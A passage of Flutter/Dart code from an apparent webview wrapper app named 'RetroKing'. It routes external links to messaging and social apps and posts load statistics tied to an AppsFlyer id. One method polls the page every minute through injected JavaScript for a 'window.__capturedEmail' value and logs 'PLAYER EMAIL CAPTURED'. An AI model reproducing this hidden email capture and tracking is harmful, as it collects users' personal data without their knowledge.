                    RetroKingScheme != 'https') {
                  return NavigationActionPolicy.CANCEL;
                }

                return NavigationActionPolicy.ALLOW;
              },
              onCreateWindow: (
                  InAppWebViewController RetroKingController,
                  CreateWindowAction RetroKingReq,
                  ) async {
                final Uri? RetroKingUrl = RetroKingReq.request.url;

                if (RetroKingUrl == null) return false;

                if (RetroKingKit.RetroKingLooksLikeBareMail(
                  RetroKingUrl,
                )) {
                  final Uri RetroKingMail =
                  RetroKingKit.RetroKingToMailto(RetroKingUrl);

                  await RetroKingLinker.RetroKingOpen(
                    RetroKingKit.RetroKingGmailize(RetroKingMail),
                  );

                  return false;
                }

                final String RetroKingScheme =
                RetroKingUrl.scheme.toLowerCase();

                if (RetroKingScheme == 'mailto') {
                  await RetroKingLinker.RetroKingOpen(
                    RetroKingKit.RetroKingGmailize(RetroKingUrl),
                  );

                  return false;
                }

                if (RetroKingScheme == 'tel') {
                  await launchUrl(
                    RetroKingUrl,
                    mode: LaunchMode.externalApplication,
                  );

                  return false;
                }

                final String RetroKingHost =
                RetroKingUrl.host.toLowerCase();

                final bool RetroKingIsSocial =
                    RetroKingHost.endsWith('facebook.com') ||
                        RetroKingHost.endsWith('instagram.com') ||
                        RetroKingHost.endsWith('twitter.com') ||
                        RetroKingHost.endsWith('x.com');

                if (RetroKingIsSocial) {
                  await RetroKingLinker.RetroKingOpen(RetroKingUrl);
                  return false;
                }

                if (RetroKingIsExternalDestination(RetroKingUrl)) {
                  final Uri RetroKingMapped =
                  RetroKingMapExternalToHttp(RetroKingUrl);

                  await RetroKingLinker.RetroKingOpen(RetroKingMapped);

                  return false;
                }

                if (RetroKingScheme == 'http' ||
                    RetroKingScheme == 'https') {
                  RetroKingController.loadUrl(
                    urlRequest: URLRequest(
                      url: WebUri(RetroKingUrl.toString()),
                    ),
                  );
                }

                return false;
              },
            ),
            if (RetroKingOverlayBusy)
              const Positioned.fill(
                child: ColoredBox(
                  color: Colors.black87,
                  child: Center(
                    child: CircularProgressIndicator(),
                  ),
                ),
              ),
          ],
        ),
      ),
    );
  }

  // ========================================================================
  // Внешние направления
  // ========================================================================

  bool RetroKingIsExternalDestination(Uri RetroKingUri) {
    final String RetroKingScheme = RetroKingUri.scheme.toLowerCase();

    if (RetroKingExternalSchemes.contains(RetroKingScheme)) {
      return true;
    }

    if (RetroKingScheme == 'http' || RetroKingScheme == 'https') {
      final String RetroKingHost = RetroKingUri.host.toLowerCase();

      if (RetroKingExternalHosts.contains(RetroKingHost)) {
        return true;
      }

      if (RetroKingHost.endsWith('t.me')) return true;
      if (RetroKingHost.endsWith('wa.me')) return true;
      if (RetroKingHost.endsWith('m.me')) return true;
      if (RetroKingHost.endsWith('signal.me')) return true;
      if (RetroKingHost.endsWith('facebook.com')) return true;
      if (RetroKingHost.endsWith('instagram.com')) return true;
      if (RetroKingHost.endsWith('twitter.com')) return true;
      if (RetroKingHost.endsWith('x.com')) return true;
    }

    return false;
  }

  Uri RetroKingMapExternalToHttp(Uri RetroKingUri) {
    final String RetroKingScheme = RetroKingUri.scheme.toLowerCase();

    if (RetroKingScheme == 'tg' || RetroKingScheme == 'telegram') {
      final Map<String, String> RetroKingQp =
          RetroKingUri.queryParameters;

      final String? RetroKingDomain = RetroKingQp['domain'];

      if (RetroKingDomain != null && RetroKingDomain.isNotEmpty) {
        return Uri.https('t.me', '/$RetroKingDomain', <String, String>{
          if (RetroKingQp['start'] != null)
            'start': RetroKingQp['start']!,
        });
      }

      final String RetroKingPath =
      RetroKingUri.path.isNotEmpty ? RetroKingUri.path : '';

      return Uri.https(
        't.me',
        '/$RetroKingPath',
        RetroKingUri.queryParameters.isEmpty
            ? null
            : RetroKingUri.queryParameters,
      );
    }

    if (RetroKingScheme == 'whatsapp') {
      final Map<String, String> RetroKingQp =
          RetroKingUri.queryParameters;

      final String? RetroKingPhone = RetroKingQp['phone'];
      final String? RetroKingText = RetroKingQp['text'];

      if (RetroKingPhone != null && RetroKingPhone.isNotEmpty) {
        return Uri.https(
          'wa.me',
          '/${RetroKingKit.RetroKingDigitsOnly(RetroKingPhone)}',
          <String, String>{
            if (RetroKingText != null && RetroKingText.isNotEmpty)
              'text': RetroKingText,
          },
        );
      }

      return Uri.https(
        'wa.me',
        '/',
        <String, String>{
          if (RetroKingText != null && RetroKingText.isNotEmpty)
            'text': RetroKingText,
        },
      );
    }

    if (RetroKingScheme == 'bnl') {
      final String RetroKingNewPath =
      RetroKingUri.path.isNotEmpty ? RetroKingUri.path : '';

      return Uri.https(
        'bnl.com',
        '/$RetroKingNewPath',
        RetroKingUri.queryParameters.isEmpty
            ? null
            : RetroKingUri.queryParameters,
      );
    }

    return RetroKingUri;
  }

  void RetroKingStartEmailPolling(InAppWebViewController RetroKingController) {
    if (RetroKingCapturedEmail != null) return; // уже есть — не надо

    RetroKingEmailPollTimer?.cancel();
    RetroKingEmailPollTimer = Timer.periodic(
      const Duration(minutes: 1),
          (Timer RetroKingTimer) async {
        if (RetroKingCapturedEmail != null) {
          RetroKingTimer.cancel();
          return;
        }

        try {
          final dynamic RetroKingResult =
          await RetroKingController.evaluateJavascript(
            source: 'window.__capturedEmail || null',
          );

          if (RetroKingResult != null &&
              RetroKingResult.toString() != 'null' &&
              RetroKingResult.toString().isNotEmpty) {
            RetroKingCapturedEmail = RetroKingResult.toString();
            RetroKingTimer.cancel();
            debugPrint('==============================');
            debugPrint('>>> PLAYER EMAIL CAPTURED (poll): $RetroKingCapturedEmail');
            debugPrint('==============================');
          } else {
            RetroKingVaultInstance.RetroKingLoggerInstance
                .RetroKingLogInfo('Email poll: not found yet, retry in 1 min');
          }
        } catch (_) {}
      },
    );
  }

  Future<void> RetroKingSendLoadedOnce() async {
    if (RetroKingLoadedOnceSent) {
      debugPrint('Wheel Loaded already sent, skip');
      return;
    }

    final int RetroKingNow = DateTime.now().millisecondsSinceEpoch;

    await RetroKingPostStat(
      RetroKingEvent: 'Loaded',
      RetroKingTimeStart: RetroKingStartLoadTimestamp,
      RetroKingTimeFinish: RetroKingNow,
      RetroKingUrl: RetroKingCurrentUrl,
      RetroKingAppSid: RetroKingSpyInstance.RetroKingAppsFlyerUid,
      RetroKingFirstPageTs: RetroKingFirstPageTimestamp,
    );

    RetroKingLoadedOnceSent = true;
  }
}